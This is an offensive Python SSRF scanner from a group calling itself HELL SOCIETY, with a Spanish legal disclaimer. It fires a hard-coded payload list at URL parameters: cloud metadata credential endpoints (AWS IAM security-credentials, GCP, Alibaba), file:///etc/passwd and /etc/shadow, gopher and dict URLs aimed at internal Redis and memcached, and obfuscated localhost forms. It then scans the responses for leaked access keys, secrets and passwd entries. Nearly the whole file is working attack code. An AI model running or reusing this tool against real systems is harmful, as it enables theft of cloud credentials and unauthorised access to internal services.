#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  SSRF VULNERABILITY SCANNER v2.0                                 ║
║  Created by: HELL SOCIETY Community                              ║
║  Category: Offensive - Web Pentesting                            ║
╚══════════════════════════════════════════════════════════════════╝

ADVERTENCIA LEGAL: El uso de esta herramienta sin autorización
escrita del propietario del sistema objetivo es ILEGAL.
Los creadores NO se hacen responsables del mal uso de esta herramienta.
"""

import requests
import sys
import colorama
from colorama import Fore, Back, Style
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import argparse

colorama.init(autoreset=True)

BANNER = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════╗
║{Fore.YELLOW}   ███████╗███████╗███████╗████████╗███████╗██╗███╗   ██╗████████╗ {Fore.RED}║
║{Fore.YELLOW}   ██╔════╝██╔════╝██╔════╝╚══██╔══╝██╔════╝██║████╗  ██║╚══██╔══╝ {Fore.RED}║
║{Fore.YELLOW}   ███████╗█████╗  ███████╗   ██║   █████╗  ██║██╔██╗ ██║   ██║    {Fore.RED}║
║{Fore.YELLOW}   ╚════██║██╔══╝  ╚════██║   ██║   ██╔══╝  ██║██║╚██╗██║   ██║    {Fore.RED}║
║{Fore.YELLOW}   ███████║███████╗███████║   ██║   ██║     ██║██║ ╚████║   ██║    {Fore.RED}║
║{Fore.YELLOW}   ╚══════╝╚══════╝╚══════╝   ╚═╝   ╚═╝     ╚═╝╚═╝  ╚═══╝   ╚═╝    {Fore.RED}║
╠══════════════════════════════════════════════════════════════════╣
║{Fore.CYAN}  HELL SOCIETY - SSRF Scanner v2.0                                      {Fore.RED}║
╚══════════════════════════════════════════════════════════════════╝
"""

DISCLAIMER = f"""
{Fore.RED}{Back.BLACK}
[!] ADVERTENCIA LEGAL [!]
Esta herramienta es para uso en pentesting AUTORIZADO únicamente.
Los creadores (HELL SOCIETY) NO se hacen responsables del mal uso.
"""

SSRF_PAYLOADS = [
    'http://127.0.0.1',
    'http://localhost',
    'http://0.0.0.0',
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/user-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://localhost:8080',
    'http://localhost:3000',
    'http://localhost:6379',
    'http://localhost:27017',
    'http://127.0.0.1:8080',
    'http://127.0.0.1:3000',
    'http://[::1]',
    'http://0:8080',
    'http://127.1',
    'http://2130706433',
    'http://017700000001',
    'http://0x7f000001',
    'http://127.0.0.1.nip.io',
    'http://localtest.me',
    'http://spoofed.burpcollaborator.net',
    'file:///etc/passwd',
    'file:///etc/shadow',
    'gopher://127.0.0.1:25/',
    'dict://127.0.0.1:11211/',
    'ftp://127.0.0.1/',
    'http://metadata.google.internal/',
    'http://169.254.169.254/computeMetadata/v1/',
    'http://100.100.100.200/latest/meta-data/',
]

class SSRFScanner:
    def __init__(self, target, timeout=10):
        self.target = target
        self.timeout = timeout
        self.vulns = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) HellSociety/2.0'
        })

    def get_params(self):
        parsed = urlparse(self.target)
        return parse_qs(parsed.query)

    def modify_url(self, param, payload):
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                          parsed.params, new_query, parsed.fragment))

    def scan(self):
        params = self.get_params()
        if not params:
            print(f"{Fore.RED}  [!] No parameters found in URL")
            return

        url_params = [k for k in params.keys() if any(
            keyword in k.lower() for keyword in
            ['url', 'uri', 'link', 'redirect', 'dest', 'destination',
             'target', 'rurl', 'return', 'returnto', 'return_url',
             'next', 'redir', 'redirect_uri', 'redirect_url',
             'image_url', 'img', 'src', 'source', 'file',
             'feed', 'rss', 'xml', 'api', 'endpoint', 'callback',
             'webhook', 'ping', 'fetch', 'load', 'open', 'read',
             'download', 'upload', 'path', 'folder', 'dir']
        )]

        if not url_params:
            url_params = list(params.keys())

        total = len(url_params) * len(SSRF_PAYLOADS)
        current = 0

        print(f"{Fore.CYAN}  [*] Testing {len(url_params)} parameter(s) with {len(SSRF_PAYLOADS)} SSRF payloads")
        print(f"{Fore.CYAN}  [*] Total tests: {total}\n")

        for param in url_params:
            for payload in SSRF_PAYLOADS:
                current += 1
                progress = (current / total) * 100
                bar_length = 40
                filled = int(bar_length * current / total)
                bar = f"{Fore.GREEN}█{Style.RESET_ALL}" * filled + f"{Fore.RED}░{Style.RESET_ALL}" * (bar_length - filled)
                print(f"\r{Fore.CYAN}  [{bar}] {progress:.1f}% - Testing: {param}={payload[:35]}", end="", flush=True)

                test_url = self.modify_url(param, payload)
                try:
                    resp = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)

                    if resp.status_code in [200, 301, 302, 303, 307, 308]:
                        content = resp.text
                        indicators = ['root:', 'daemon:', 'aws-', 'accessKeyId',
                                     'secretAccessKey', 'token', 'metadata',
                                     'instance-id', 'ami-id', 'hostname',
                                     'internal-ip', 'local-ipv4']

                        for indicator in indicators:
                            if indicator in content:
                                result = {
                                    'param': param,
                                    'payload': payload,
                                    'status': resp.status_code,
                                    'indicator': indicator
                                }
                                self.vulns.append(result)
                                print(f"\n")
                                print(f"  {Fore.GREEN}[+] SSRF VULNERABLE!")
                                print(f"  {Fore.GREEN}  Parameter: {Fore.WHITE}{param}")
                                print(f"  {Fore.GREEN}  Payload: {Fore.YELLOW}{payload}")
                                print(f"  {Fore.GREEN}  Status: {resp.status_code}")
                                print(f"  {Fore.GREEN}  Indicator: {Fore.WHITE}{indicator}")
                                print(f"  {Fore.CYAN}  {'─' * 60}")
                                break

                except requests.exceptions.Timeout:
                    pass
                except requests.exceptions.ConnectionError:
                    pass
                except requests.exceptions.RequestException:
                    pass

    def print_results(self):
        if not self.vulns:
            print(f"\n\n{Fore.YELLOW}  [!] No SSRF vulnerabilities found")
            return

        print(f"\n\n{Fore.RED}{Back.BLACK}  SCAN COMPLETE - {len(self.vulns)} VULNERABILITY(IES) FOUND  ")
        print(f"{Fore.CYAN}  {'═' * 60}")

        for i, v in enumerate(self.vulns, 1):
            print(f"\n  {Fore.CYAN}[{i}] {Fore.WHITE}Param: {v['param']}")
            print(f"      {Fore.YELLOW}Payload: {v['payload']}")
            print(f"      {Fore.GREEN}Status: {v['status']} | Indicator: {v['indicator']}")

def main():
    print(BANNER)
    print(DISCLAIMER)

    parser = argparse.ArgumentParser(description='Hell Society SSRF Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL with parameters')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout')
    args = parser.parse_args()

    scanner = SSRFScanner(args.url, args.timeout)
    print(f"{Fore.CYAN}  [*] Target: {Fore.WHITE}{args.url}")
    print(f"{Fore.CYAN}  [*] Starting SSRF scan...\n")

    scanner.scan()
    scanner.print_results()

if __name__ == "__main__":
    main()
